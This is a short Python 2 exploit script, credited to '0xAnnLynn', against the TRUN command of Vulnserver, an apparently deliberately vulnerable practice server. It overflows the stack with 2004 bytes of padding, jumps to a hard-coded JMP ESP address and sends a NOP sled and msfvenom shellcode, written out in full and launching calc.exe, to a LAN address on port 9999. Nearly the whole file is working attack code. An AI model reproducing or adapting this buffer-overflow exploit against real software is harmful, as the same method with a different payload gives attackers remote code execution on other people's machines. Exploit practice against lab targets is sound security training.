#!/usr/bin/env python

import sys, socket

print "``````````````````````````````````````````````````````````````````````"
print "`   Exploit By      : 0xAnnLynn                                      `"
print "`   Exploit Title   : Vulnserver (TRUN)                              `"
print "`   Exploit Date    : 16.11.2020                                     `"
print "`   Practice        : Unknown                                        `"
print "`   GitHub          : https://github.com/TamilHackz/i-make-exploits  `"
print "`                                                                    `"
print "``````````````````````````````````````````````````````````````````````"
# Identified Bad characters "\x00"
# msfvenom -p windows/exec CMD=calc.exe -b '\x00' -f c

offset = "A"*2004 + "\xaf\x11\x50\x62" #625011af JMP ESP Address
shellcode = (
"\xdb\xc5\xbb\xf8\xc9\xa9\xb2\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x31\x31\x5a\x18\x03\x5a\x18\x83\xea\x04\x2b\x5c\x4e\x1c\x2e"
"\x9f\xaf\xdc\x4f\x29\x4a\xed\x4f\x4d\x1e\x5d\x60\x05\x72\x51"
"\x0b\x4b\x67\xe2\x79\x44\x88\x43\x37\xb2\xa7\x54\x64\x86\xa6"
"\xd6\x77\xdb\x08\xe7\xb7\x2e\x48\x20\xa5\xc3\x18\xf9\xa1\x76"
"\x8d\x8e\xfc\x4a\x26\xdc\x11\xcb\xdb\x94\x10\xfa\x4d\xaf\x4a"
"\xdc\x6c\x7c\xe7\x55\x77\x61\xc2\x2c\x0c\x51\xb8\xae\xc4\xa8"
"\x41\x1c\x29\x05\xb0\x5c\x6d\xa1\x2b\x2b\x87\xd2\xd6\x2c\x5c"
"\xa9\x0c\xb8\x47\x09\xc6\x1a\xac\xa8\x0b\xfc\x27\xa6\xe0\x8a"
"\x60\xaa\xf7\x5f\x1b\xd6\x7c\x5e\xcc\x5f\xc6\x45\xc8\x04\x9c"
"\xe4\x49\xe0\x73\x18\x89\x4b\x2b\xbc\xc1\x61\x38\xcd\x8b\xef"
"\xbf\x43\xb6\x5d\xbf\x5b\xb9\xf1\xa8\x6a\x32\x9e\xaf\x72\x91"
"\xdb\x40\x39\xb8\x4d\xc9\xe4\x28\xcc\x94\x16\x87\x12\xa1\x94"
"\x22\xea\x56\x84\x46\xef\x13\x02\xba\x9d\x0c\xe7\xbc\x32\x2c"
"\x22\xdf\xd5\xbe\xae\x0e\x70\x47\x54\x4f"
)
nops = "\x90"*30
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.0.110',9999))
s.send(('TRUN /.:' + offset+nops+shellcode))
s.close()
